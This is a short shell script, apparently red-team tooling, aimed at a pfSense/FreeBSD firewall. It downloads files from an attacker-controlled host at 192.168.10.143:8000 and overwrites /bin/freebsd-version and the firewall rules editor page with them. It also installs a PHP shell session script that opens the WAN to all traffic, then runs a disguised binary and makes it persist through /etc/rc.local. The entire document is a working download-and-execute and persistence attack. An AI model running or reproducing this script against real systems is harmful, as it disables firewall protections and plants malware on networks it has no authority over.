theip="192.168.10.143"
theport=8000
fetch -o /etc/phpshellsessions/redteam http://${theip}:${theport}/net/pfsense/enableallowallwan
fetch -o /bin/freebsd-version http://${theip}:${theport}/net/pfsense/user.php
fetch -o /usr/local/www/firewall_rules_edit.php http://${theip}:${theport}/net/pfsense/firewall_rules_edit.php
fetch -o /usr/share/nomalwarehere.pdf.exe http://${theip}:${theport}/mal/unix/somefreebsd
chmod +x /bin/freebsd-version
chmod +x /usr/share/nomalwarehere.pdf.exe
/bin/freebsd-version
/bin/freebsd-version
/bin/freebsd-version
cp /cf/conf/config.xml /cf/conf/config.bkg
/usr/share/nomalwarehere.pdf.exe &
echo "/usr/share/nomalwarehere.pdf.exe >> /dev/null &" >> /etc/rc.local
unset theip
unset theport
